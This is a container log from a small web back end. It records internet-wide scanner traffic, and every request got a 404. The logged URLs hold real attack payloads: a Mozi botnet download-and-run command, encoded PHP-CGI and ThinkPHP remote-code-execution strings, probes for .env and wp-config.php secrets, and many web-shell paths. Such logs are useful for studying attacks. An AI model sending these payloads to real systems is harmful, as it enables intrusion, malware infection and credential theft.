Attaching to back-end-live-tutor_server_1, back-end-live-tutor_database_1
database_1  | The files belonging to this database system will be owned by user "postgres".
server_1    | [0mGET / [33m404[0m 0.758 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.562 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.519 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.577 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.887 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.526 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.566 ms - 40[0m
server_1    | [0mGET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws [33m404[0m 2.000 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.643 ms - 40[0m
server_1    | [0mGET /boaform/admin/formLogin?username=ec8&psd=ec8 [33m404[0m 0.568 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.735 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.519 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.611 ms - 40[0m
server_1    | [0mGET /config/getuser?index=0 [33m404[0m 0.544 ms - 40[0m
server_1    | [0mOPTIONS / [32m204[0m 5.453 ms - 0[0m
server_1    | [0mGET /manager/html/ [33m404[0m 13.149 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.579 ms - 40[0m
server_1    | [0mGET / [33m404[0m 2.966 ms - 40[0m
server_1    | [0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [33m404[0m 0.651 ms - 40[0m
server_1    | [0mGET /wp-content/plugins/wp-file-manager/readme.txt [33m404[0m 0.652 ms - 40[0m
server_1    | [0mGET /console/ [33m404[0m 0.711 ms - 40[0m
server_1    | [0mPOST /Autodiscover/Autodiscover.xml [33m404[0m 20.243 ms - 40[0m
server_1    | [0mPOST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404[0m 3.306 ms - 40[0m
server_1    | [0mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404[0m 0.870 ms - 40[0m
server_1    | [0mGET /?XDEBUG_SESSION_START=phpstorm [33m404[0m 0.738 ms - 40[0m
server_1    | [0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 [33m404[0m 0.768 ms - 40[0m
server_1    | [0mPOST /api/jsonws/invoke [33m404[0m 0.783 ms - 40[0m
server_1    | [0mGET /solr/admin/info/system?wt=json [33m404[0m 0.706 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.732 ms - 40[0m
server_1    | [0mGET / [33m404[0m 1.983 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.542 ms - 40[0m
server_1    | [0mHEAD /robots.txt [33m404[0m 0.947 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.731 ms - 40[0m
server_1    | [0mGET /scan.html [33m404[0m 0.648 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.621 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.743 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.662 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.657 ms - 40[0m
server_1    | [0mGET /.env [33m404[0m 0.614 ms - 40[0m
server_1    | [0mPOST / [33m404[0m 1.970 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.677 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.810 ms - 40[0m
server_1    | [0mGET /robots.txt [33m404[0m 0.554 ms - 40[0m
server_1    | [0mPOST /Admincc1280b2/Login.php [33m404[0m 1.574 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.538 ms - 40[0m
server_1    | [0mGET /l.php [33m404[0m 0.577 ms - 40[0m
server_1    | [0mGET /phpinfo.php [33m404[0m 0.517 ms - 40[0m
server_1    | [0mGET /test.php [33m404[0m 0.581 ms - 40[0m
server_1    | [0mPOST /index.php [33m404[0m 2.530 ms - 40[0m
server_1    | [0mPOST /bbs.php [33m404[0m 1.049 ms - 40[0m
server_1    | [0mPOST /forum.php [33m404[0m 0.989 ms - 40[0m
server_1    | [0mPOST /forums.php [33m404[0m 0.869 ms - 40[0m
server_1    | [0mPOST /bbs/index.php [33m404[0m 1.165 ms - 40[0m
server_1    | [0mPOST /forum/index.php [33m404[0m 1.030 ms - 40[0m
server_1    | [0mPOST /forums/index.php [33m404[0m 1.221 ms - 40[0m
server_1    | [0mPOST /ajax/render/widget_tabbedcontainer_tab_panel [33m404[0m 26.477 ms - 40[0m
server_1    | [0mPOST /bbs/ajax/render/widget_tabbedcontainer_tab_panel [33m404[0m 0.854 ms - 40[0m
server_1    | [0mPOST /forum/ajax/render/widget_tabbedcontainer_tab_panel [33m404[0m 1.015 ms - 40[0m
server_1    | [0mPOST /forums/ajax/render/widget_tabbedcontainer_tab_panel [33m404[0m 0.902 ms - 40[0m
server_1    | [0mPOST /cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E [33m404[0m 0.953 ms - 40[0m
server_1    | [0mPOST /cgi-bin/php5?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E [33m404[0m 0.973 ms - 40[0m
server_1    | [0mPOST /cgi-bin/php-cgi?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E [33m404[0m 0.973 ms - 40[0m
server_1    | [0mPOST /cgi-bin/php.cgi?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E [33m404[0m 0.831 ms - 40[0m
server_1    | [0mPOST /cgi-bin/php4?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E [33m404[0m 1.198 ms - 40[0m
server_1    | [0mPOST /%62%61%73%65/%70%6F%73%74%2E%70%68%70 [33m404[0m 0.963 ms - 40[0m
server_1    | [0mGET /webdav/ [33m404[0m 0.629 ms - 40[0m
server_1    | [0mGET /%69%73%70%69%72%69%74/%69%6D/%75%70%6C%6F%61%64%2E%70%68%70 [33m404[0m 0.660 ms - 40[0m
server_1    | [0mGET /help.php [33m404[0m 0.852 ms - 40[0m
server_1    | [0mGET /java.php [33m404[0m 0.665 ms - 40[0m
server_1    | [0mGET /_query.php [33m404[0m 0.560 ms - 40[0m
server_1    | [0mGET /test.php [33m404[0m 0.857 ms - 40[0m
server_1    | [0mGET /db_cts.php [33m404[0m 0.523 ms - 40[0m
server_1    | [0mGET /db_pma.php [33m404[0m 0.626 ms - 40[0m
server_1    | [0mGET /logon.php [33m404[0m 0.583 ms - 40[0m
server_1    | [0mGET /help-e.php [33m404[0m 0.603 ms - 40[0m
server_1    | [0mGET /license.php [33m404[0m 0.728 ms - 40[0m
server_1    | [0mGET /log.php [33m404[0m 0.704 ms - 40[0m
server_1    | [0mGET /hell.php [33m404[0m 0.610 ms - 40[0m
server_1    | [0mGET /pmd_online.php [33m404[0m 0.565 ms - 40[0m
server_1    | [0mGET /x.php [33m404[0m 0.547 ms - 40[0m
server_1    | [0mGET /shell.php [33m404[0m 0.549 ms - 40[0m
server_1    | [0mGET /htdocs.php [33m404[0m 0.631 ms - 40[0m
server_1    | [0mGET /b.php [33m404[0m 0.764 ms - 40[0m
server_1    | [0mGET /sane.php [33m404[0m 0.597 ms - 40[0m
server_1    | [0mGET /desktop.ini.php [33m404[0m 0.566 ms - 40[0m
server_1    | [0mGET /z.php [33m404[0m 0.785 ms - 40[0m
server_1    | [0mGET /lala.php [33m404[0m 0.629 ms - 40[0m
server_1    | [0mGET /lala-dpr.php [33m404[0m 0.594 ms - 40[0m
server_1    | [0mGET /wpc.php [33m404[0m 0.573 ms - 40[0m
server_1    | [0mGET /wpo.php [33m404[0m 0.893 ms - 40[0m
server_1    | [0mGET /t6nv.php [33m404[0m 0.555 ms - 40[0m
server_1    | [0mGET /muhstik.php [33m404[0m 0.632 ms - 40[0m
server_1    | [0mGET /text.php [33m404[0m 0.521 ms - 40[0m
server_1    | [0mGET /wp-config.php [33m404[0m 0.537 ms - 40[0m
server_1    | [0mGET /muhstik.php [33m404[0m 0.570 ms - 40[0m
server_1    | [0mGET /muhstik2.php [33m404[0m 0.709 ms - 40[0m
server_1    | [0mGET /muhstiks.php [33m404[0m 0.556 ms - 40[0m
server_1    | [0mGET /muhstik-dpr.php [33m404[0m 0.722 ms - 40[0m
server_1    | [0mGET /lol.php [33m404[0m 0.619 ms - 40[0m
server_1    | [0mGET /uploader.php [33m404[0m 0.588 ms - 40[0m
server_1    | [0mGET /cmd.php [33m404[0m 5.534 ms - 40[0m
server_1    | [0mGET /cmv.php [33m404[0m 0.564 ms - 40[0m
server_1    | [0mGET /cmdd.php [33m404[0m 0.538 ms - 40[0m
server_1    | [0mGET /knal.php [33m404[0m 0.533 ms - 40[0m
server_1    | [0mGET /cmd.php [33m404[0m 0.639 ms - 40[0m
server_1    | [0mGET /shell.php [33m404[0m 0.852 ms - 40[0m
server_1    | [0mGET /appserv.php [33m404[0m 0.569 ms - 40[0m
server_1    | [0mGET /scripts/setup.php [33m404[0m 0.703 ms - 40[0m
server_1    | [0mGET /phpmyadmin/scripts/setup.php [33m404[0m 0.783 ms - 40[0m
server_1    | [0mGET /phpMyAdmin/scripts/setup.php [33m404[0m 0.511 ms - 40[0m
server_1    | [0mGET /scripts/db___.init.php [33m404[0m 0.587 ms - 40[0m
server_1    | [0mGET /phpmyadmin/scripts/db___.init.php [33m404[0m 0.529 ms - 40[0m
server_1    | [0mGET /phpMyAdmin/scripts/db___.init.php [33m404[0m 0.594 ms - 40[0m
server_1    | [0mGET /pma/scripts/setup.php [33m404[0m 0.575 ms - 40[0m
server_1    | [0mGET /PMA/scripts/setup.php [33m404[0m 0.942 ms - 40[0m
server_1    | [0mGET /myadmin/scripts/setup.php [33m404[0m 0.793 ms - 40[0m
server_1    | [0mGET /MyAdmin/scripts/setup.php [33m404[0m 0.540 ms - 40[0m
server_1    | [0mGET /pma/scripts/db___.init.php [33m404[0m 0.555 ms - 40[0m
server_1    | [0mGET /PMA/scripts/db___.init.php [33m404[0m 0.579 ms - 40[0m
server_1    | [0mGET /myadmin/scripts/db___.init.php [33m404[0m 0.580 ms - 40[0m
server_1    | [0mGET /MyAdmin/scripts/db___.init.php [33m404[0m 0.647 ms - 40[0m
server_1    | [0mGET /plugins/weathermap/editor.php [33m404[0m 0.592 ms - 40[0m
server_1    | [0mGET /cacti/plugins/weathermap/editor.php [33m404[0m 0.514 ms - 40[0m
server_1    | [0mGET /weathermap/editor.php [33m404[0m 0.561 ms - 40[0m
server_1    | [0mGET /index.php?s=%2f%69%6e%64%65%78%2f%5c%74%68%69%6e%6b%5c%61%70%70%2f%69%6e%76%6f%6b%65%66%75%6e%63%74%69%6f%6e&function=%63%61%6c%6c%5f%75%73%65%72%5f%66%75%6e%63%5f%61%72%72%61%79&vars[0]=%6d%645&vars[1][]=%48%65%6c%6c%6f%54%68%69%6e%6b%50%48%50 [33m404[0m 0.503 ms - 40[0m
server_1    | [0mGET /elrekt.php?s=%2f%69%6e%64%65%78%2f%5c%74%68%69%6e%6b%5c%61%70%70%2f%69%6e%76%6f%6b%65%66%75%6e%63%74%69%6f%6e&function=%63%61%6c%6c%5f%75%73%65%72%5f%66%75%6e%63%5f%61%72%72%61%79&vars[0]=%6d%645&vars[1][]=%48%65%6c%6c%6f%54%68%69%6e%6b%50%48%50 [33m404[0m 0.564 ms - 40[0m
server_1    | [0mGET /App/?content=die(md5(HelloThinkPHP)) [33m404[0m 0.550 ms - 40[0m
server_1    | [0mGET /index.php/module/action/param1/${@die(md5(HelloThinkPHP))} [33m404[0m 0.736 ms - 40[0m
server_1    | [0mGET /index.php?s=/module/action/param1/${@die(md5(HelloThinkPHP))} [33m404[0m 0.575 ms - 40[0m
server_1    | [0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [33m404[0m 0.512 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.562 ms - 40[0m
server_1    | [0mGET /joomla/ [33m404[0m 0.533 ms - 40[0m
server_1    | [0mGET /Joomla/ [33m404[0m 0.536 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.735 ms - 40[0m
server_1    | [0mGET /d7.php [33m404[0m 0.560 ms - 40[0m
server_1    | [0mGET /rxr.php [33m404[0m 0.522 ms - 40[0m
server_1    | [0mGET /1x.php [33m404[0m 0.562 ms - 40[0m
server_1    | [0mGET /home.php [33m404[0m 0.635 ms - 40[0m
server_1    | [0mGET /undx.php [33m404[0m 0.697 ms - 40[0m
server_1    | [0mGET /spider.php [33m404[0m 0.625 ms - 40[0m
server_1    | [0mGET /payload.php [33m404[0m 0.816 ms - 40[0m
server_1    | [0mGET /composers.php [33m404[0m 0.542 ms - 40[0m
server_1    | [0mGET /izom.php [33m404[0m 0.779 ms - 40[0m
server_1    | [0mGET /composer.php [33m404[0m 0.556 ms - 40[0m
server_1    | [0mGET /hue2.php [33m404[0m 0.687 ms - 40[0m
server_1    | [0mGET /Drupal.php [33m404[0m 0.551 ms - 40[0m
server_1    | [0mGET /lang.php?f=1 [33m404[0m 0.786 ms - 40[0m
server_1    | [0mGET /izom.php [33m404[0m 0.606 ms - 40[0m
server_1    | [0mGET /payload.php [33m404[0m 0.518 ms - 40[0m
server_1    | [0mGET /new_license.php [33m404[0m 0.505 ms - 40[0m
server_1    | [0mGET /images/!.php [33m404[0m 0.508 ms - 40[0m
server_1    | [0mGET /images/vuln.php [33m404[0m 0.557 ms - 40[0m
server_1    | [0mGET /hd.php [33m404[0m 0.715 ms - 40[0m
server_1    | [0mGET /images/up.php [33m404[0m 0.711 ms - 40[0m
server_1    | [0mGET /images/attari.php [33m404[0m 0.940 ms - 40[0m
server_1    | [0mGET /images/jsspwneed.php [33m404[0m 0.586 ms - 40[0m
server_1    | [0mGET /images/stories/cmd.php [33m404[0m 0.778 ms - 40[0m
server_1    | [0mGET /images/stories/filemga.php?ssp=RfVbHu [33m404[0m 0.574 ms - 40[0m
server_1    | [0mGET /up.php [33m404[0m 0.530 ms - 40[0m
server_1    | [0mGET /laravel.php [33m404[0m 0.544 ms - 40[0m
server_1    | [0mGET /huoshan.php [33m404[0m 0.576 ms - 40[0m
server_1    | [0mGET /yu.php [33m404[0m 0.701 ms - 40[0m
server_1    | [0mGET /floaw.php [33m404[0m 0.579 ms - 40[0m
server_1    | [0mGET /ftmabc.php [33m404[0m 0.557 ms - 40[0m
server_1    | [0mGET /doudou.php [33m404[0m 0.682 ms - 40[0m
server_1    | [0mGET /mjx.php [33m404[0m 0.506 ms - 40[0m
server_1    | [0mGET /xiaoxia.php [33m404[0m 0.546 ms - 40[0m
server_1    | [0mGET /yuyang.php [33m404[0m 0.735 ms - 40[0m
server_1    | [0mGET /zz.php [33m404[0m 0.670 ms - 40[0m
server_1    | [0mGET /coonig.php [33m404[0m 0.579 ms - 40[0m
server_1    | [0mGET /ak.php [33m404[0m 0.621 ms - 40[0m
server_1    | [0mGET /baidoubi.php [33m404[0m 0.887 ms - 40[0m
server_1    | [0mGET /hhhhhh.php [33m404[0m 0.582 ms - 40[0m
server_1    | [0mGET /meijianxue.php [33m404[0m 0.536 ms - 40[0m
server_1    | [0mGET /no1.php [33m404[0m 0.762 ms - 40[0m
server_1    | [0mGET /python.php [33m404[0m 0.788 ms - 40[0m
server_1    | [0mGET /woshimengmei.php [33m404[0m 0.610 ms - 40[0m
server_1    | [0mGET /indea.php [33m404[0m 0.530 ms - 40[0m
server_1    | [0mGET /taisui.php [33m404[0m 0.544 ms - 40[0m
server_1    | [0mGET /xiaxia.php [33m404[0m 0.648 ms - 40[0m
server_1    | [0mGET /kk.php [33m404[0m 0.536 ms - 40[0m
server_1    | [0mGET /xsser.php [33m404[0m 0.655 ms - 40[0m
server_1    | [0mGET /zzz.php [33m404[0m 0.546 ms - 40[0m
server_1    | [0mGET /99.php [33m404[0m 0.579 ms - 40[0m
server_1    | [0mGET /dp.php [33m404[0m 0.593 ms - 40[0m
server_1    | [0mGET /hs.php [33m404[0m 0.816 ms - 40[0m
server_1    | [0mGET /1ts.php [33m404[0m 0.555 ms - 40[0m
server_1    | [0mGET /haiyan.php [33m404[0m 0.760 ms - 40[0m
server_1    | [0mGET /phpdm.php [33m404[0m 0.604 ms - 40[0m
server_1    | [0mGET /root.php [33m404[0m 0.799 ms - 40[0m
server_1    | [0mGET /5678.php [33m404[0m 0.589 ms - 40[0m
server_1    | [0mGET /root11.php [33m404[0m 0.611 ms - 40[0m
server_1    | [0mGET /xiu.php [33m404[0m 0.593 ms - 40[0m
server_1    | [0mGET /wp-content/plugins/wp-file-manager/readme.txt [33m404[0m 0.531 ms - 40[0m
server_1    | [0mGET /wordpress/wp-content/plugins/wp-file-manager/readme.txt [33m404[0m 1.354 ms - 40[0m
server_1    | [0mGET /WordPress/wp-content/plugins/wp-file-manager/readme.txt [33m404[0m 0.776 ms - 40[0m
server_1    | [0mGET /wp/wp-content/plugins/wp-file-manager/readme.txt [33m404[0m 0.695 ms - 40[0m
server_1    | [0mGET /WP/wp-content/plugins/wp-file-manager/readme.txt [33m404[0m 0.602 ms - 40[0m
server_1    | [0mGET /cms/wp-content/plugins/wp-file-manager/readme.txt [33m404[0m 0.844 ms - 40[0m
server_1    | [0mGET /blog/wp-content/plugins/wp-file-manager/readme.txt [33m404[0m 0.564 ms - 40[0m
server_1    | [0mGET /Blog/wp-content/plugins/wp-file-manager/readme.txt [33m404[0m 0.702 ms - 40[0m
server_1    | [0mGET /dev/wp-content/plugins/wp-file-manager/readme.txt [33m404[0m 0.561 ms - 40[0m
server_1    | [0mGET /demo/wp-content/plugins/wp-file-manager/readme.txt [33m404[0m 0.782 ms - 40[0m
server_1    | [0mGET /site/wp-content/plugins/wp-file-manager/readme.txt [33m404[0m 0.558 ms - 40[0m
server_1    | [0mGET /old/wp-content/plugins/wp-file-manager/readme.txt [33m404[0m 0.535 ms - 40[0m
server_1    | [0mGET /backup/wp-content/plugins/wp-file-manager/readme.txt [33m404[0m 0.723 ms - 40[0m
server_1    | [0mPOST /templates.php [33m404[0m 0.889 ms - 40[0m
server_1    | [0mPOST /yitian.php [33m404[0m 0.889 ms - 40[0m
server_1    | [0mPOST /shell.php [33m404[0m 1.181 ms - 40[0m
server_1    | [0mPOST /wuwu11.php [33m404[0m 0.931 ms - 40[0m
server_1    | [0mPOST /xw.php [33m404[0m 0.996 ms - 40[0m
server_1    | [0mPOST /xw1.php [33m404[0m 0.994 ms - 40[0m
server_1    | [0mPOST /9678.php [33m404[0m 1.193 ms - 40[0m
server_1    | [0mPOST /wc.php [33m404[0m 0.970 ms - 40[0m
server_1    | [0mPOST /xx.php [33m404[0m 0.899 ms - 40[0m
server_1    | [0mPOST /xx.php [33m404[0m 0.867 ms - 40[0m
server_1    | [0mPOST /s.php [33m404[0m 1.200 ms - 40[0m
server_1    | [0mPOST /w.php [33m404[0m 1.066 ms - 40[0m
server_1    | [0mPOST /sheep.php [33m404[0m 0.898 ms - 40[0m
server_1    | [0mPOST /qaq.php [33m404[0m 0.922 ms - 40[0m
server_1    | [0mPOST /my.php [33m404[0m 0.887 ms - 40[0m
server_1    | [0mPOST /qq.php [33m404[0m 0.819 ms - 40[0m
server_1    | [0mPOST /aaa.php [33m404[0m 0.966 ms - 40[0m
server_1    | [0mPOST /hhh.php [33m404[0m 1.084 ms - 40[0m
server_1    | [0mPOST /jjj.php [33m404[0m 1.256 ms - 40[0m
server_1    | [0mPOST /vvv.php [33m404[0m 1.069 ms - 40[0m
server_1    | [0mPOST /www.php [33m404[0m 0.886 ms - 40[0m
server_1    | [0mPOST /ffr.php [33m404[0m 0.835 ms - 40[0m
server_1    | [0mPOST /411.php [33m404[0m 0.854 ms - 40[0m
server_1    | [0mPOST /415.php [33m404[0m 0.886 ms - 40[0m
server_1    | [0mPOST /421.php [33m404[0m 0.915 ms - 40[0m
server_1    | [0mPOST /444.php [33m404[0m 0.890 ms - 40[0m
server_1    | [0mPOST /a411.php [33m404[0m 0.869 ms - 40[0m
server_1    | [0mPOST /whoami.php [33m404[0m 0.829 ms - 40[0m
server_1    | [0mPOST /whoami.php.php [33m404[0m 0.851 ms - 40[0m
server_1    | [0mPOST /9.php [33m404[0m 0.964 ms - 40[0m
server_1    | [0mPOST /98k.php [33m404[0m 0.906 ms - 40[0m
server_1    | [0mPOST /981.php [33m404[0m 0.961 ms - 40[0m
server_1    | [0mPOST /887.php [33m404[0m 1.099 ms - 40[0m
server_1    | [0mPOST /888.php [33m404[0m 1.011 ms - 40[0m
server_1    | [0mPOST /aa.php [33m404[0m 0.902 ms - 40[0m
server_1    | [0mPOST /bb.php [33m404[0m 0.909 ms - 40[0m
server_1    | [0mPOST /pp.php [33m404[0m 1.053 ms - 40[0m
server_1    | [0mPOST /tt.php [33m404[0m 0.912 ms - 40[0m
server_1    | [0mPOST /bbq.php [33m404[0m 0.809 ms - 40[0m
server_1    | [0mPOST /jj1.php [33m404[0m 1.148 ms - 40[0m
server_1    | [0mPOST /jbb.php [33m404[0m 0.918 ms - 40[0m
server_1    | [0mPOST /7o.php [33m404[0m 0.883 ms - 40[0m
server_1    | [0mPOST /qwq.php [33m404[0m 1.346 ms - 40[0m
server_1    | [0mPOST /nb.php [33m404[0m 0.899 ms - 40[0m
server_1    | [0mPOST /kpl.php [33m404[0m 0.833 ms - 40[0m
server_1    | [0mPOST /hgx.php [33m404[0m 1.237 ms - 40[0m
server_1    | [0mPOST /ppl.php [33m404[0m 1.432 ms - 40[0m
server_1    | [0mPOST /tty.php [33m404[0m 0.883 ms - 40[0m
server_1    | [0mPOST /ooi.php [33m404[0m 1.274 ms - 40[0m
server_1    | [0mPOST /aap.php [33m404[0m 1.163 ms - 40[0m
server_1    | [0mPOST /app.php [33m404[0m 1.061 ms - 40[0m
server_1    | [0mPOST /bbr.php [33m404[0m 0.978 ms - 40[0m
server_1    | [0mPOST /ioi.php [33m404[0m 1.041 ms - 40[0m
server_1    | [0mPOST /uuu.php [33m404[0m 0.861 ms - 40[0m
server_1    | [0mPOST /yyy.php [33m404[0m 1.014 ms - 40[0m
server_1    | [0mPOST /shh.php [33m404[0m 0.798 ms - 40[0m
server_1    | [0mPOST /ddd.php [33m404[0m 0.958 ms - 40[0m
server_1    | [0mPOST /nnn.php [33m404[0m 7.165 ms - 40[0m
server_1    | [0mPOST /rrr.php [33m404[0m 1.038 ms - 40[0m
server_1    | [0mPOST /ttt.php [33m404[0m 1.330 ms - 40[0m
server_1    | [0mPOST /bbqq.php [33m404[0m 0.909 ms - 40[0m
server_1    | [0mPOST /tyrant.php [33m404[0m 0.779 ms - 40[0m
server_1    | [0mPOST /qiqi.php [33m404[0m 1.346 ms - 40[0m
server_1    | [0mPOST /qiqi1.php [33m404[0m 0.874 ms - 40[0m
server_1    | [0mPOST /zhk.php [33m404[0m 1.289 ms - 40[0m
server_1    | [0mPOST /bbv.php [33m404[0m 1.085 ms - 40[0m
server_1    | [0mPOST /605.php [33m404[0m 1.248 ms - 40[0m
server_1    | [0mPOST /admin1.php [33m404[0m 1.190 ms - 40[0m
server_1    | [0mPOST /xi.php [33m404[0m 0.908 ms - 40[0m
server_1    | [0mPOST /999.php [33m404[0m 0.920 ms - 40[0m
server_1    | [0mPOST /jsc.php [33m404[0m 0.900 ms - 40[0m
server_1    | [0mPOST /jsc.php.php [33m404[0m 1.165 ms - 40[0m
server_1    | [0mPOST /jsc.php [33m404[0m 1.301 ms - 40[0m
server_1    | [0mPOST /11a.php [33m404[0m 1.208 ms - 40[0m
server_1    | [0mPOST /kkl.php [33m404[0m 1.020 ms - 40[0m
